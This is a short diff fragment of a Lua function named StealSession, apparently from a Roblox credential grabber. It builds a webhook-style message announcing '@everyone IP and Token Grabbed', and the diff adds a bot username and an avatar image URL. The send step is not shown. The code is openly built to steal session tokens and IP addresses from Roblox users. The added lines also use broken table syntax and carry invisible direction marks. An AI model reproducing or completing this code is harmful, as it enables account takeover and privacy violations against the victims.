@@ -7,6 +7,10 @@
 ‏local function StealSession()
 
 ‏    local data = {
+ 
+        ["username"]: "Account Roblox 🤖",
+    
+        ["avatar_url"]: "https://i.ibb.co/Zp5tPpJj/IMG-3928.png",
 
 ‏        ["content"] = "@everyone IP and Token Grabbed",
 
